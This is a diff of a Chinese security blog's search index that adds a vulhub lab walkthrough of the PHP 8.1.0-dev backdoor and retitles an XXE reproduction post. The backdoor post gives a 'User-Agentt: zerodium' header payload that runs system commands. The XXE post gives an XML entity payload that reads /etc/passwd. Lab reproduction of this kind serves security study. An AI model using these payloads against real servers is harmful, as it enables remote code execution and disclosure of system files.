@@ -4,11 +4,44 @@
   
     
     <entry>
+      <title>php-8.1.0开发版本后门漏洞</title>
+      <link href="/2022/05/05/php-backdoor/"/>
+      <url>/2022/05/05/php-backdoor/</url>
+      
+        <content type="html"><![CDATA[<h1 id="PHP-8-1-0-dev开发版本后门事件"><a href="#PHP-8-1-0-dev开发版本后门事件" class="headerlink" title="PHP 8.1.0-dev开发版本后门事件"></a>PHP 8.1.0-dev开发版本后门事件</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被发现并清除。当服务器存在该后门时，攻击者可以通过发送<strong>User-Agentt</strong>头来执行任意代码。</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/php/8.1-backdoordocker-compose up -d</code></pre><h3 id="复现测试"><a href="#复现测试" class="headerlink" title="复现测试"></a>复现测试</h3><p>先打开burpsuite，抓取<code>http://192.168.3.151:8080</code>数据包</p><p>构造payload</p><pre><code>User-Agentt: zerodiumvar_dump(233*233);</code></pre><p><img src="/2022/05/05/php-backdoor/image-20220505161158695.png" alt="image-20220505161158695"></p><p>执行一下系统命令</p><pre><code>User-Agentt: zerodiumsystem(&#39;id&#39;);</code></pre><p><img src="/2022/05/05/php-backdoor/image-20220505161250514.png" alt="image-20220505161250514"></p><p>ok结束！</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 环境搭建 </tag>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> 网络安全 </tag>
+            
+            <tag> vulhub </tag>
+            
+            <tag> PHP </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>PHP XML外部实体注入漏洞(XXE)复现</title>
       <link href="/2022/05/05/php-xxe/"/>
       <url>/2022/05/05/php-xxe/</url>
       
-        <content type="html"><![CDATA[<h1 id="XML外部实体注入漏洞复现"><a href="#XML外部实体注入漏洞复现" class="headerlink" title="XML外部实体注入漏洞复现"></a>XML外部实体注入漏洞复现</h1><h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><blockquote><p>PHP 7.0.30</p><p>libxml 2.8.0</p></blockquote><p><code>libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。为了演示PHP环境下的XXE漏洞，本例会将libxml2.8.0版本编译进PHP中。PHP版本并不影响XXE利用。</code></p><h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/php/php_xxedocker-compose up -d</code></pre><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>先打开网页看看</p><p><img src="/2022/05/05/php-xxe/image-20220505153517058.png" alt="image-20220505153517058"></p><p>访问<code>http://192.168.3.151:8080/index.php</code>能看到phpinfo</p><p>在里面可以看到<code>libxml</code>版本</p><p><img src="/2022/05/05/php-xxe/image-20220505153702980.png" alt="image-20220505153702980"></p><p>Web目录为<code>www</code>，里面有4个文件</p><pre><code>tree .dom.php #使用DOMDocument解析bodyindex.phpSimpleXMLElement.php #使用SimpleXMLElement类解析bodySimplexml_load_string.php #使用simplexml_load_string函数解析body</code></pre><p>构造payload</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> <span class="token doctype">&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY ></span>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" >]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>打开burpsuite抓取数据包</p><p>然后把这玩意扔进去</p><p><img src="/2022/05/05/php-xxe/image-20220505154735442.png" alt="image-20220505154735442"></p><p>获得<code>/etc/passwd</code>里面的内容</p><p><img src="/2022/05/05/php-xxe/image-20220505154753664.png" alt="image-20220505154753664"></p>]]></content>
+        <content type="html"><![CDATA[<h1 id="PHP-XML外部实体注入漏洞复现"><a href="#PHP-XML外部实体注入漏洞复现" class="headerlink" title="PHP XML外部实体注入漏洞复现"></a>PHP XML外部实体注入漏洞复现</h1><h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><blockquote><p>PHP 7.0.30</p><p>libxml 2.8.0</p></blockquote><p><code>libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。为了演示PHP环境下的XXE漏洞，本例会将libxml2.8.0版本编译进PHP中。PHP版本并不影响XXE利用。</code></p><h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/php/php_xxedocker-compose up -d</code></pre><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>先打开网页看看</p><p><img src="/2022/05/05/php-xxe/image-20220505153517058.png" alt="image-20220505153517058"></p><p>访问<code>http://192.168.3.151:8080/index.php</code>能看到phpinfo</p><p>在里面可以看到<code>libxml</code>版本</p><p><img src="/2022/05/05/php-xxe/image-20220505153702980.png" alt="image-20220505153702980"></p><p>Web目录为<code>www</code>，里面有4个文件</p><pre><code>tree .dom.php #使用DOMDocument解析bodyindex.phpSimpleXMLElement.php #使用SimpleXMLElement类解析bodySimplexml_load_string.php #使用simplexml_load_string函数解析body</code></pre><p>构造payload</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> <span class="token doctype">&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY ></span>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" >]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>打开burpsuite抓取数据包</p><p>然后把这玩意扔进去</p><p><img src="/2022/05/05/php-xxe/image-20220505154735442.png" alt="image-20220505154735442"></p><p>获得<code>/etc/passwd</code>里面的内容</p><p><img src="/2022/05/05/php-xxe/image-20220505154753664.png" alt="image-20220505154753664"></p>]]></content>
       
       
       <categories>
@@ -1603,9 +1636,9 @@
       
         <tags>
             
-            <tag> 编程 </tag>
-            
             <tag> PHP </tag>
+            
+            <tag> 编程 </tag>
             
             <tag> mysql </tag>
             
@@ -1665,11 +1698,11 @@
             
             <tag> 网络安全 </tag>
             
+            <tag> 工具使用 </tag>
+            
             <tag> 木马 </tag>
             
             <tag> msf </tag>
-            
-            <tag> 工具使用 </tag>
             
             <tag> 免杀 </tag>
             
@@ -1725,9 +1758,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> windows </tag>
-            
             <tag> 工具使用 </tag>
+            
+            <tag> windows </tag>
             
         </tags>
       
@@ -1756,9 +1789,9 @@
             
             <tag> Linux </tag>
             
-            <tag> 工具使用 </tag>
-            
             <tag> 操作系统 </tag>
+            
+            <tag> 工具使用 </tag>
             
         </tags>
       
@@ -2080,11 +2113,11 @@
             
             <tag> 网络安全 </tag>
             
+            <tag> 工具使用 </tag>
+            
             <tag> 内网渗透 </tag>
             
             <tag> msf </tag>
-            
-            <tag> 工具使用 </tag>
             
             <tag> cs </tag>
             
@@ -2113,9 +2146,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 内网渗透 </tag>
-            
             <tag> 工具使用 </tag>
+            
+            <tag> 内网渗透 </tag>
             
             <tag> cs </tag>
             
@@ -2144,9 +2177,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 内网渗透 </tag>
-            
             <tag> 工具使用 </tag>
+            
+            <tag> 内网渗透 </tag>
             
             <tag> cs </tag>
             
@@ -2175,9 +2208,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 内网渗透 </tag>
-            
             <tag> 工具使用 </tag>
+            
+            <tag> 内网渗透 </tag>
             
             <tag> cs </tag>
             
@@ -2206,9 +2239,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 内网渗透 </tag>
-            
             <tag> 工具使用 </tag>
+            
+            <tag> 内网渗透 </tag>
             
             <tag> cs </tag>
             
@@ -2237,9 +2270,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 内网渗透 </tag>
-            
             <tag> 工具使用 </tag>
+            
+            <tag> 内网渗透 </tag>
             
             <tag> cs </tag>
             
@@ -2268,9 +2301,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 内网渗透 </tag>
-            
             <tag> 工具使用 </tag>
+            
+            <tag> 内网渗透 </tag>
             
             <tag> cs </tag>
             
@@ -2299,9 +2332,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 内网渗透 </tag>
-            
             <tag> 工具使用 </tag>
+            
+            <tag> 内网渗透 </tag>
             
             <tag> cs </tag>
             
@@ -2330,9 +2363,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 内网渗透 </tag>
-            
             <tag> 工具使用 </tag>
+            
+            <tag> 内网渗透 </tag>
             
             <tag> cs </tag>
             
